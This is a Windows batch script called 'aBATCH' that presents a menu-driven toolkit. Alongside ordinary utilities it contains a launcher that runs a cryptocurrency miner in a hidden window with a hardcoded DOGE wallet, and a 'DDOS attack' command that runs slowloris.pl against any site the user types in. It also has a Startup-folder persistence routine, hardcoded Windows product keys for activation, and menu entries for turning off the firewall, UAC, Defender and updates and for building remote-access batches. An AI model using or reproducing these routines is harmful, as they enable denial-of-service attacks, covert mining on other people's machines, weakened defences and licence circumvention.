@Echo off
SetLocal EnableExtensions EnableDelayedExpansion
FOR /F "tokens=2 delims==" %%A in ('wmic OS get OSArchitecture /value ^| find "="') do SET Arquitetura=%%A
FOR /F "tokens=2 delims==" %%A in ('wmic OS get Caption /value ^| find "="') do SET SO=%%A
title [ aBATCH ]  ::  Advanced Batch  Build 38  [ %SO% - %Arquitetura% ]
ren %~0 aBATCH.bat
MODE CON COLS=85 LINES=9999
color 0e
cls

IF NOT EXIST %~dp0settings.ini (
Echo [SETUP]
Echo HVOICE=0
Echo.
Echo [FTP]
Echo FTPLOGIN=
Echo FTPPASS=
Echo FTPURL=
Echo.
Echo [ZPOOLMINER]
Echo ZPEXENAME=cpuminer.exe
Echo ZPALGORITHM=yescrypt
Echo ZPSERVER=stratum+tcp://yescrypt.mine.zpool.ca:6233
Echo ZPWALLET=DBMT7WPp6waGRj94bwHnPFg7kGXYwTFZ9g
Echo ZPSYMBOL=DOGE
Echo ZPTHREADS=3
) > %~dp0settings.ini

SET INIFILE="%~dp0settings.ini"

SET "Arguments=%~1"
IF not defined Arguments (Goto:FIRSTLOAD)
SET Pasta=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
copy "%Arguments%" "%pasta%\" 2 > NUL 2>&1 && msg * /time 3 "Installation Completed, the file will start with the Windows^!" || msg * /time 3 "ERROR?"
timeout 1 /nobreak > NUL 2>&1
Exit

:FIRSTLOAD
call:getvalue %INIFILE% "HVOICE" "" HVOICE
IF %HVOICE% == 1 Echo. CreateObject("SAPI.SpVoice").Speak"Hello %username%" >> %~dp0hvoice.vbs & START %~dp0hvoice.vbs
FOR /F "tokens=4 delims= " %%i in ('route print ^| find " 0.0.0.0"') do set localIp=%%i
IF [%localIP%]==[] SET localIP=127.0.0.1
IF [%localIP%] NEQ [127.0.0.1] Echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") > %~dp0dl.vbs & Echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> %~dp0dl.vbs & Echo xHttp.Open "GET", "http://meuip.com/api/meuip.php", False >> %~dp0dl.vbs & Echo xHttp.Send >> %~dp0dl.vbs & Echo with bStrm >> %~dp0dl.vbs & Echo     .type = 1 '//binary >> %~dp0dl.vbs & Echo     .open >> %~dp0dl.vbs & Echo     .write xHttp.responseBody >> %~dp0dl.vbs & Echo     .savetofile "%~dp0dl.txt", 2 '//overwrite >> %~dp0dl.vbs & Echo end with >> %~dp0dl.vbs & start /min /WAIT %~dp0dl.vbs & for /f "delims=" %%x in (%~dp0dl.txt) do set "ExtIP=%%x"  & del /q %~dp0dl.vbs & del /q %~dp0dl.txt
IF [%ExtIP%]==[] SET ExtIP=     Not Found     
IF EXIST %~dp0hvoice.vbs DEL %~dp0hvoice.vbs > NUL 2>&1

:CHECK_ADMIN
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Goto CHECK_NORMAL
Echo:
Echo                  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Echo: 
Echo                  	[ADMIN MODE]
Echo						User: %username%
Echo                                    INTERNAL        EXTERNAL
Echo                             IPs [%localIP%] [%ExtIP%]
Echo:
Goto Inicio

:CHECK_NORMAL
Echo:
Echo                  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Echo:
Echo                  	[BASIC MODE]
Echo						User: %username%
Echo                                    INTERNAL        EXTERNAL
Echo                             IPs [%localIP%] [%ExtIP%]
Echo:

:Inicio
Echo                  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Echo:
SET /a CONTA=0
SET /p "Comando=%CD%> "
FOR %%B IN (abcdefghijklmnopqrstuvwxyz) DO (SET LETRASY=%%B)
FOR %%C IN (ABCDEFGHIJKLMNOPQRSTUVWXYZ) DO (SET LETRASX=%%C)
:CmdList
SET/a CONTA+=1
CALL SET FINAL=%%LETRASX:~-%CONTA%,1%%
CALL SET FINALX=%%LETRASY:~-%CONTA%,1%%
SET Comando=!Comando:%FINAL%=%FINALX%!
IF %CONTA% == 28 (
rem aBATCH CMDS:
IF "%Comando%" equ "-cmd" SET /p cmd=!cd!^> & !cmd! & Goto Inicio
IF "%Comando%" equ "commands" (Goto Commands)
IF "%Comando%" equ "credits" (Goto Credits)
IF "%Comando%" equ "restart" START %~0 & Exit
IF "%Comando%" equ "refresh" START %~0 & Exit
IF "%Comando%" equ "reload" START %~0 & Exit
IF "%Comando%" equ "cl" cls & Goto CHECK_ADMIN
IF "%Comando%" equ "cls" cls & Goto CHECK_ADMIN
IF "%Comando%" equ "clear" cls & Goto CHECK_ADMIN
IF "%Comando%" equ "update" Goto ATT

rem PLUGINS
IF "%Comando%" equ "ngrok" (Goto NGROK)
IF "%Comando%" equ "ddos attack" (Goto DDOSATTACK)
IF "%Comando%" equ "zpool miner" (Goto ZPOOLMINERCHECK_SHOW)
IF "%Comando%" equ "zpool miner hide" (Goto ZPOOLMINERCHECK_HIDE)

rem FUNCTIONS:
IF "%Comando%" equ "windows active" (Goto WindowsActive)
IF "%Comando%" equ "taskkill" (Goto Taskk)
IF "%Comando%" equ "active x excel off" (Goto ACTIVE_X_Excel)
IF "%Comando%" equ "bs" (Goto BLOCKSITES)
IF "%Comando%" equ "bs list" (Goto BLOCKSITES_List)
IF "%Comando%" equ "cf" (Goto CHECK_LIMPARPASTASVAZIAS)
IF "%Comando%" equ "system info" (Goto SystemInfo)
IF "%Comando%" equ "telnet on" (Goto TELNET_ACTIVE)
IF "%Comando%" equ "telnet off" (Goto TELNET_DESACTIVE)
IF "%Comando%" equ "bluesoleil active " (Goto BlueSoleil_x64)
IF "%Comando%" equ "screen light" (Goto LEVEL_BRIGHT)
IF "%Comando%" equ "export wifi profiles" (Goto EXPORTWIFI)
IF "%Comando%" equ "wifi password" (Goto WiFiPassword)
IF "%Comando%" equ "uac on" (Goto UAC_ACTIVE)
IF "%Comando%" equ "uac off" (Goto UAC_DESACTIVE)
IF "%Comando%" equ "firewall on" (Goto FireWallON)
IF "%Comando%" equ "firewall off" (Goto FireWallOFF)
IF "%Comando%" equ "windows defender on" (Goto WDefenderON)
IF "%Comando%" equ "windows defender off" (Goto WDefenderOFF)
IF "%Comando%" equ "system boost" (Goto SYSTEMBOOST)
IF "%Comando%" equ "pr0ject windows" (Goto pr0jectWindows)
IF "%Comando%" equ "wup on" (Goto WINUPDATEON)
IF "%Comando%" equ "wup off" (Goto WINUPDATEOFF)
IF "%Comando%" equ "hide disk" (Goto HIDE_DISK_DIRECTORY)
IF "%Comando%" equ "show disk" (Goto SHOW_HIDE_DISK_DIRECTORY)
IF "%Comando%" equ "test ipv4" (Goto TESTLOCALIPS)
IF "%Comando%" equ "linux cmds on" (Goto LINUXCMD_ACTIVE)
IF "%Comando%" equ "linux cmds off" (Goto LINUXCMD_DESACTIVE)

rem HOTSPOT:
IF "%Comando%" equ "hotspot config" (Goto WIFIHOTSPOT)
IF "%Comando%" equ "hotspot start" (Goto WIFIHOTSPOT_ON)
IF "%Comando%" equ "hotspot stop" (Goto WIFIHOTSPOT_OFF)

rem FTP ACCESS:
IF "%Comando%" equ "ftp access" (Goto FTP_ACCESS)
IF "%Comando%" equ "ftp access load" (Goto LOAD_FTP_ACCESS)

rem REMOTE ACCESS:
IF "%Comando%" equ "build remote access" (Goto build_remote_access)
IF "%Comando%" equ "connect remote access" (Goto connect_remote_access)
IF "%Comando%" equ "scan remote access" (Goto scan_remote_access)
IF "%Comando%" equ "tools remote access" (Goto tools_remote_access)

IF "%Comando%" equ "" (Echo: & Echo. * Unknown command^^! & Echo: & Goto Inicio)
Echo:
) else (Goto CmdList)
Echo: & Echo. * Unknown command^^! & Echo: & Goto Inicio

:getvalue
FOR /F "eol=; eol=[ tokens=1,2* delims==" %%i in ('findstr /b /l /i %~2= %1') DO SET %~4=%%~j
Goto:eof

:Commands
Echo:
IF EXIST %~dp0CommandsList RD /S /Q %~dp0CommandsList > NUL 2>&1
MD %~dp0CommandsList
CD %~dp0CommandsList\
Echo:
Echo   aBATCH CMDS:
Echo:
Echo. to use Command Prompt > " . [ -cmd ]"
Echo. show the commands > " . [ Commands ]"
Echo. Show the Credits > " . [ Credits ]"
Echo. Restart the Program > " . [ Restart ] or [ Refresh ] or [ Reload ]"
Echo. Clear the Screen > " . [ Cl ] or [ Cls ] or [ Clear ]"
Echo. Update the aBATCH > " . [ Update ]"
FINDSTR /A:c /C:" to use Command Prompt " /S " . [ -cmd ]"
FINDSTR /A:c /C:" show the commands " /S " . [ Commands ]"
FINDSTR /A:c /C:" Show the Credits " /S " . [ Credits ]"
FINDSTR /A:c /C:" Restart the Program " /S " . [ Restart ] or [ Refresh ] or [ Reload ]"
FINDSTR /A:c /C:" Clear the Screen " /S " . [ Cl ] or [ Cls ] or [ Clear ]"
FINDSTR /A:c /C:" Update the aBATCH " /S " . [ Update ]"
IF EXIST "%~dp0Plugins" Echo: & Echo: & Echo   PLUGINS: & Echo:
call:getvalue %INIFILE% "ZPEXENAME" "" ZPEXENAME
IF EXIST "%~dp0Plugins\%ZPEXENAME%" Echo. Start Mining Coins Now > " . [ ZPOOL Miner ] or [ ZPOOL Miner Hide ]" & FINDSTR /A:c /C:" Start Mining Coins Now " /S " . [ ZPOOL Miner ] or [ ZPOOL Miner Hide ]"
IF EXIST "%~dp0Plugins\ngrok.exe" Echo. Public URLs for testing your server > " . [ NGROK ]" & FINDSTR /A:c /C:" Public URLs for testing your server " /S " . [ NGROK ]"
IF EXIST "%~dp0Plugins\slowloris.pl" Echo. DDOS Attack using slowloris.pl > " . [ DDOS Attack ]" & FINDSTR /A:c /C:" DDOS Attack using slowloris.pl " /S " . [ DDOS Attack ]"
Echo:
Echo:
Echo   FUNCTIONS:
Echo:
Echo. Active the Windows [ Windows Server isn't Supported ] > " . [ Windows Active ]"
Echo. Kill any Process > " . [ TaskKill ]"
Echo. Disable Active X Excel Warning > " . [ ACTIVE X Excel OFF ]"
Echo. Block Websites using hosts file > " . [ BS ] and [ BS list ]"
Echo. Clear any Empty Folders > " . [ CF ]"
Echo. Show a simple System Infomations > " . [ System Info ]"
Echo. Enable or Disable the Telnet Client > " . [ Telnet ON ] or [ OFF ]"
Echo. Active the BlueSoleil > " . [ BlueSoleil Active ]"
Echo. Change the level of bright on your screen > " . [ Screen Light ]"
Echo. Save in XML File all WiFi Profiles > " . [ Export WiFi Profiles ]"
Echo. Show password WiFi IF you are Connected to it > " . [ WiFi Password ]"
Echo. Enable or Disable the User Account Control > " . [ UAC ON ] or [ OFF ]"
Echo. Enable or Disable the FireWall > " . [ FireWall ON ] or [ OFF ]"
Echo. Enable or Disable the Windows Defender > " . [ Windows Defender ON ] or [ OFF ]"
Echo. Clear and Optimize your Windows > " . [ System Boost ] and [ prject Windows ]"
Echo. Enable or Disable the Windows Update > " . [ WUP ON ] or [ OFF ]"
Echo. Show or Hide Disk > " . [ SHOW DISK ] or [ HIDE DISK ]"
Echo. Check IPv4 Connections > " . [ IPv4 Test ]"
Echo. Linux Commands > " . [ Linux Cmds ON ] or [ OFF ]"
FINDSTR /A:c /C:" Active the Windows [ Windows Server isn't Supported ] " /S " . [ Windows Active ]"
FINDSTR /A:c /C:" Kill any Process " /S " . [ TaskKill ]"
FINDSTR /A:c /C:" Disable Active X Excel Warning " /S " . [ ACTIVE X Excel OFF ]"
FINDSTR /A:c /C:" Block Websites using hosts file " /S " . [ BS ] and [ BS list ]"
FINDSTR /A:c /C:" Clear any Empty Folders " /S " . [ CF ]"
FINDSTR /A:c /C:" Show a simple System Infomations " /S " . [ System Info ]"
FINDSTR /A:c /C:" Enable or Disable the Telnet Client " /S " . [ Telnet ON ] or [ OFF ]"
FINDSTR /A:c /C:" Active the BlueSoleil " /S " . [ BlueSoleil Active ]"
FINDSTR /A:c /C:" Change the level of bright on your screen " /S " . [ Screen light ]"
FINDSTR /A:c /C:" Save in XML File all WiFi Profiles " /S " . [ Export WiFi Profiles ]"
FINDSTR /A:c /C:" Show password WiFi IF you are Connected to it " /S " . [ WiFi Password ]"
FINDSTR /A:c /C:" Enable or Disable the User Account Control " /S " . [ UAC ON ] or [ OFF ]"
FINDSTR /A:c /C:" Enable or Disable the FireWall " /S " . [ FireWall ON ] or [ OFF ]"
FINDSTR /A:c /C:" Enable or Disable the Windows Defender " /S " . [ Windows Defender ON ] or [ OFF ]"
FINDSTR /A:c /C:" Clear and Optimize your Windows " /S " . [ System Boost ] and [ prject Windows ]"
FINDSTR /A:c /C:" Enable or Disable the Windows Update " /S " . [ WUP ON ] or [ OFF ]"
FINDSTR /A:c /C:" Show or Hide Disk " /S " . [ SHOW DISK ] or [ HIDE DISK ]"
FINDSTR /A:c /C:" Check IPv4 Connections " /S " . [ IPv4 Test ]"
FINDSTR /A:c /C:" Linux Commands " /S " . [ Linux Cmds ON ] or [ OFF ]"
Echo:
Echo:
Echo   HOTSPOT:
Echo:
Echo. Configure your WiFi Hotspot > " . [ Hotspot Config ]"
Echo. Start or Stop your connection > " . [ Hotspot START ] or [ STOP ]"
FINDSTR /A:c /C:" Configure your WiFi Hotspot " /S " . [ Hotspot Config ]"
FINDSTR /A:c /C:" Start or Stop your connection " /S " . [ Hotspot START ] or [ STOP ]"
Echo:
Echo:
Echo   FTP ACCESS:
Echo:
Echo. Access your FTP Server > " . [ FTP Access ]"
Echo. Access your INI FTP Server > " . [ FTP Access LOAD ]"
FINDSTR /A:c /C:" Access your FTP Server " /S " . [ FTP Access ]"
FINDSTR /A:c /C:" Access your INI FTP Server " /S " . [ FTP Access LOAD ]"
Echo:
Echo:
Echo   REMOTE ACCESS:
Echo:
Echo. Build the remote Batch > " . [ Build Remote Access ]"
Echo. Remote Access > " . [ Connect Remote Access ]"
Echo. Scan Connection > " . [ Scan Remote Access ]"
Echo. Tools > " . [ Tools Remote Access ]"
FINDSTR /A:c /C:" Build the remote Batch " /S " . [ Build Remote Access ]"
FINDSTR /A:c /C:" Remote Access " /S " . [ Connect Remote Access ]"
FINDSTR /A:c /C:" Scan Connection " /S " . [ Scan Remote Access ]"
FINDSTR /A:c /C:" Tools " /S " . [ Tools Remote Access ]"
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 CD.. & RD /S /Q %~dp0CommandsList & Echo: & Goto Inicio
CD.. & RD /S /Q %~dp0CommandsList
Echo: & Goto Inicio

rem aBATCH CMDS:

:Credits
Echo:
SET "Texto1= Thanks for"
SET "Texto2= all batch community"
SET "Texto3= WebSite"
SET "Texto4= coming soon..."
Echo:
call :Color_ir 0C "%Texto1%"
call :Color_ir 08 "%Texto2%"
Echo:
call :Color_ir 0C "%Texto3%"
call :Color_ir 08 "%Texto4%"
Echo: & Goto Inicio

:Color_ir
mkdir %~dp0$temp || (Exit /b 2)
pushd %~dp0$temp || (rmdir %~dp0$temp & Exit /b 1)
for /f "delims=" %%. in ('
    "%ComsPec% /K Prompt $h$h <&1"
 ') do >o_o Echo %%.
Call:Tex_to %1 %2
popd
rmdir /S /Q %~dp0$temp
Endlocal & Exit /b 0
:Tex_to
>%2 (SET/P=+) <&1
findstr /a:%1 + %2 con
type o_o
Goto :EOF

rem PLUGINS:

rem https://github.com/tpruvot/cpuminer-multi/releases
:ZPOOLMINERCHECK_SHOW
call:getvalue %INIFILE% "ZPEXENAME" "" ZPEXENAME
IF EXIST "%~dp0plugins\%ZPEXENAME%" (
Echo:
Echo. cpuminer miner [OK] 
CALL :ZPCREATE
START %~dp0tmp.bat
timeout 1 /nobreak > NUL 2>&1
DEL %~dp0tmp.bat
Echo: & Echo. Executed^^! & Echo: & Goto Inicio
) ELSE (
Echo: & Echo. Install cpuminer plugin^^! & Echo. Fail^^! & Echo: & Goto Inicio
)

:ZPOOLMINERCHECK_HIDE
call:getvalue %INIFILE% "ZPEXENAME" "" ZPEXENAME
IF EXIST "%~dp0plugins\%ZPEXENAME%" (
Echo:
Echo. cpuminer miner [OK]  
CALL :ZPCREATE_HIDE
CALL :ZPCREATE
START %~dp0zphide.vbs
timeout 1 /nobreak > NUL 2>&1
DEL %~dp0tmp.bat
DEL %~dp0zphide.vbs
Echo: & Echo. Executed^^! & Echo: & Goto Inicio
) ELSE (
Echo: & Echo. Install cpuminer plugin^^! & Echo. Fail^^! & Echo: & Goto Inicio
)

:ZPCREATE
call:getvalue %INIFILE% "ZPEXENAME" "" ZPEXENAME
call:getvalue %INIFILE% "ZPALGORITHM" "" ZPALGORITHM
call:getvalue %INIFILE% "ZPSERVER" "" ZPSERVER
call:getvalue %INIFILE% "ZPWALLET" "" ZPWALLET
call:getvalue %INIFILE% "ZPSYMBOL" "" ZPSYMBOL
call:getvalue %INIFILE% "ZPTHREADS" "" ZPTHREADS
(
echo @echo off
echo echo:
echo echo                   ______    _____       ____       ____      _       
echo echo                  l___  /   l  __ \     / __ \     / __ \    l l      
echo echo                     / /    l l__) l   l l  l l   l l  l l   l l     
echo echo                    / /     l  ___/    l l  l l   l l  l l   l l      
echo echo                   / /__    l l        l l__l l   l l__l l   l l____  
echo echo                  /_____l   l_l         \____/     \____/    l______l
echo echo: 
Echo echo                  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  
echo echo: 
echo title [ aBATCH ]  ::  ZPOOL MINER  ::  by pr0ject404 
echo %~dp0plugins\%ZPEXENAME% -a %ZPALGORITHM% -o %ZPSERVER% -u %ZPWALLET% -p c=%ZPSYMBOL% -t %ZPTHREADS% 
echo pause 
) > %~dp0tmp.bat
Goto :EOF

:ZPCREATE_HIDE
(
Echo Set oShell = CreateObject ("Wscript.Shell")
Echo Dim strArgs
Echo strArgs = "cmd /c %~dp0tmp.bat"
Echo oShell.Run strArgs, 0, false
) > %~dp0zphide.vbs
Goto :EOF

rem https://ngrok.com/
:NGROK
IF EXIST "%~dp0plugins\ngrok.exe" (
Echo:
%~dp0plugins\ngrok.exe
SET /p ngrokcmd= What you Need? Say me the Command: 
START %~dp0plugins\ngrok.exe ngrok %ngrokcmd%
Echo: & Echo. Executed^^! & Echo: & Goto Inicio
) ELSE (
Echo: & Echo. Install ngrok plugin^^! & Echo. Fail^^! & Echo: & Goto Inicio
)

rem https://github.com/pr0ject404/CODES/blob/master/Slowloris.pl
:DDOSATTACK
IF EXIST "%~dp0plugins\slowloris.pl" (
Echo:
SET /p ddosattack= WebSite ( Example: www.yoursite.com ): 
IF EXIST "C:\Perl64\bin\perl.exe" (
START perl %~dp0plugins\slowloris.pl -dns %ddosattack% -cache
Echo: & Echo. Executed^^! & Echo: & Goto Inicio
) ELSE (
Echo: & Echo. Install a Perl Module^^! & Echo. Fail^^! & Echo: & Goto Inicio
)
) ELSE (
Echo: & Echo. Install a slowloris.pl plugin^^! & Echo. Fail^^! & Echo: & Goto Inicio
)

rem FUNCTIONS:

rem https://tb.rg-adguard.net/public.php  ( download windows original )
rem https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions
:WindowsActive
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j

:w10
IF "%version%" == "10.0" (
CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ipk VK7JG-NPHTM-C97JM-9MPGT-3V66T > NUL 2>&1 & CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ato
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio
) ELSE (
Goto w81
)

:w81
IF "%version%" == "6.3" (
CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ipk GCRJD-8NW9H-F2CDX-CCM8D-9D6T9 > NUL 2>&1 & CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ato
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio
) ELSE (
Goto w8
)

:w8
IF "%version%" == "6.2" (
CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ipk NG4HW-VH26C-733KW-K6F98-J8CK4 > NUL 2>&1 & CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ato
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio
) ELSE (
Goto w7
)

:w7
IF "%version%" == "6.1" (
CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ipk FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4 > NUL 2>&1 & CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ato
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio
) ELSE (
Goto wvista
)

:wvista
IF "%version%" == "6.0" (
CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ipk 3YDB8-YY3P4-G7FCW-GJMPG-VK48C > NUL 2>&1 & CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ato
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio
) ELSE (
Goto wxpro
)

:wxpro
IF "%version%" == "5.2" (
CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ipk CTCVW-YHYP9-F2X4Y-8MQBV-6VK7D > NUL 2>&1 & CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ato
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio
) ELSE (
Goto wxp
)

:wxp
IF "%version%" == "5.1" (
CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ipk B77QF-DP27W-4H68R-72B48-78RPD > NUL 2>&1 & CSCRIPT //NOLOGO c:\windows\system32\slmgr.vbs /ato
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio
) ELSE (
Echo: & Echo. Fail^^! Your version is not supported. & Echo: & Goto Inicio
)

:taskk
tasklist 
SET /p TASKKILL= Name ( Ex: explorer.exe ): 
Echo:	
taskkill /F /IM %TASKKILL% /T 
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:ACTIVE_X_Excel
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
reg add "HKCU\SOFTWARE\Microsoft\Office\VBA\Security" /v LoadControlsInForms /t reg_dword /d 4 /f
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:BLOCKSITES
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
SET /p DDIR=SITE URL:
IF EXIST %WINDIR%\SYSTEM32\DRIVERS\ETC\HOSTS*.* ATTRIB +A -H -R -S %windir%\SYSTEM32\DRIVERS\ETC\HOSTS*.* > NUL 2>&1
Echo 127.0.0.1 %DDIR% >> %WINDIR%\system32\drivers\etc\hosts
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:BLOCKSITES_List
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Attrib -r -s -h %WINDIR%\system32\drivers\etc\hosts
notepad %WINDIR%\system32\drivers\etc\hosts
Attrib +r +s +h %WINDIR%\system32\drivers\etc\hosts
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:CHECK_LIMPARPASTASVAZIAS
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Goto LIMPARPASTASVAZIAS_NEUTRO
Echo Please, set the Directory before [Ex: C:\Users\%username%\Desktop]:
SET /p CMD=
cd %CMD%
Echo all empty folders will be deleted!
timeout 9 /nobreak
Echo Starting...
for /f "delims=" %%d in ('dir /s /b /ad ^| sort /r') do rd "%%d"
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:LIMPARPASTASVAZIAS_NEUTRO
Echo You need to run as administrator to clear other directories.
timeout 9 /nobreak
Echo all empty folders will be deleted!
Echo Starting...
for /f "delims=" %%d in ('dir /s /b /ad ^| sort /r') do rd "%%d"
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:SystemInfo
Echo:
(
Echo Option Explicit
Echo Dim WshShell,FSO,Drv,Dtype,Dfree,Dtot
Echo Dim Dname,Dpct,Dused,Dserial,Dinfo
Echo Set WshShell=WScript.CreateObject^("WScript.Shell"^)
Echo Set FSO=CreateObject^("Scripting.FileSystemObject"^)
Echo For each Drv in FSO.Drives
Echo IF Drv.DriveType=0 Then Dtype="Desconhecido  "
Echo IF Drv.DriveType=1 Then Dtype="RemovÃƒÂ­vel"
Echo IF Drv.DriveType=2 Then Dtype="Fixo          "
Echo IF Drv.DriveType=3 Then Dtype="Rede      "
Echo IF Drv.DriveType=4 Then Dtype="CD-ROM    "
Echo IF Drv.DriveType=5 Then Dtype="Flash-ram  "
Echo IF Drv.IsReady Then
Echo IF Drv.DriveType=4 Then
Echo Dfree="INDISPONIVEL"
Echo ElseIF Drv.FreeSpace^<1024^^2 Then
Echo Dfree=FormatNumber^(Drv.FreeSpace/1024,0^)^&" KB"
Echo ElseIF Drv.FreeSpace^<10240^^2 Then
Echo Dfree=FormatNumber^(Drv.FreeSpace/^(1024^^2^),2^)^&" MB"
Echo Else
Echo Dfree=FormatNumber^(Drv.FreeSpace/^(1024^^2^),0^)^&" MB"
Echo End If
Echo IF Drv.TotalSize^<1024^^2 Then
Echo Dtot=FormatNumber^(Drv.TotalSize/1024,0^)^&" KB"
Echo ElseIF Drv.TotalSize^<10240^^2 Then
Echo Dtot=FormatNumber^(Drv.TotalSize/^(1024^^2^),2^)^&" MB"
Echo Else
Echo Dtot=FormatNumber^(Drv.TotalSize/^(1024^^2^),0^)^&" MB"
Echo End If
Echo IF Drv.VolumeName="" Then
Echo Dname="[Sem Nome]"
Echo Else
Echo Dname=Drv.VolumeName
Echo End If
Echo Dused=Drv.TotalSize-Drv.FreeSpace
Echo IF Dused^<1024^^2 Then
Echo Dused=FormatNumber^(Dused/1024,0^)^&" KB"
Echo ElseIF Dused^<10240^^2 Then
Echo Dused=FormatNumber^(Dused/^(1024^^2^),2^)^&" MB"
Echo Else
Echo Dused=FormatNumber^(Dused/^(1024^^2^),0^)^&" MB"
Echo End If
Echo IF Drv.DriveType=4 Then
Echo Dpct="N/A"
Echo Else
Echo Dpct=FormatPercent^(Drv.FreeSpace/Drv.TotalSize,1^)
Echo End If
Echo IF Drv.DriveType=5 Then
Echo Dserial="N/A"
Echo Else
Echo Dserial=Hex^(Drv.SerialNumber^)
Echo End If
Echo Dinfo=Dinfo^&"Drive "^&Drv.DriveLetter^& ": " ^& "Tipo: "^&Dtype ^&vbCRLF^&_
Echo "Tipo de formato: "^&Drv.FileSystem^&vbCRLF^&_
Echo "Tamanho total: "^&Dtot^&vbCRLF^&_
Echo "Espaco livre:  "^&Dfree^&vbCRLF^&_
Echo "Nome do disco:  "^&Dname^&vbCRLF^&_
Echo "Espaco usado: "^&Dused^&vbCRLF^&_
Echo "Disponivel: "^&Dpct^&vbCRLF^&vbCRLF
rem Echo "Numero de serie: "^&Dserial^&vbCRLF^&vbCRLF
Echo Else
Echo Dinfo=Dinfo^&"Drive "^&Drv.DriveLetter^&_
Echo ":"^&_
Echo "Tipo de disco:  "^&Dtype^&_
Echo "(Sem disco no drive)"^&vbCRLF^&vbCRLF
Echo End If
Echo Next
Echo WScript.Echo Dinfo
)>"%~dp0SDISC.vbs"
for /f "delims=" %%l in ('wmic computersystem get Manufacturer^,Model^,SystemType^,TotalPhysicalMemory /format:list') do > NUL 2>&1 SET "Sistema_%%l"
for /f "delims=" %%l in ('wmic cpu get * /format:list') do > NUL 2>&1 SET "CPU_%%l"
for /f "delims=" %%l in ('wmic os get FreePhysicalMemory^,TotalVisibleMemorySize /format:list') do > NUL 2>&1 SET "OS_%%l"
SET /a OS_UsedPhysicalMemory=OS_TotalVisibleMemorySize-OS_FreePhysicalMemory
FOR /F "tokens=4" %%a in ('systeminfo ^| findstr "Memorias fisica total"') do IF defined totalMem (SET availableMem=%%a) else (SET totalMem=%%a)
FOR /F "tokens=2 delims='='" %%A in ('wmic %cstring% %ustring% %pstring% os get Name /value') do SET osname=%%A
FOR /F "tokens=1 delims='|'" %%A in ("%osname%") do SET osname=%%A
FOR /F "tokens=2 delims='='" %%A in ('wmic %cstring% %ustring% %pstring% os get ServicePackMajorVersion /value') do SET sp=%%A
SET totalMem=%totalMem%
SET availableMem=%availableMem%
SET /a usedMem=totalMem-availableMem

Echo Windows Serial:
wmic path softwarelicensingservice get OA3xOriginalProductKey

(
Echo OS: %osname%
Echo Service Pack: %sp%
Echo Board Manufacturer: %Sistema_Manufacturer%
Echo Board template: %Sistema_Model%
Echo Processor: %PROCESSOR_ARCHITECTURE%
Echo Processor type: %CPU_AddressWidth%
Echo System type: %Sistema_SystemType%
Echo RAM total: %OS_TotalVisibleMemorySize% KiB
Echo RAM free: %OS_FreePhysicalMemory% KiB
Echo RAM used: %OS_UsedPhysicalMemory% KiB
CSCRIPT /NOLOGO "%~dp0SDISC.vbs"
)>"%~dp0SLIST.TXT"
SET num=0
FOR /F "USEBACKQ TOKENS=*" %%A IN ("%~dp0SLIST.TXT") DO (
SET SINFO=%%A
call :SINFO_num
)
timeout 1 /nobreak > NUL 2>&1
DEL %~dp0SLIST.TXT
DEL %~dp0SDISC.vbs
wmic diskdrive get caption,status
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:SINFO
SET /a num=%num%+1
:SINFO_num
Echo %SINFO%
rem SET SINFO="%~1"
SET SINFO=%SINFO:(=[%
SET SINFO=%SINFO:)=]%
SET SINFO=%num% - %SINFO%
Goto:EOF

:TELNET_ACTIVE
Dism /online /Enable-Feature /FeatureName:TelnetClient /All
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

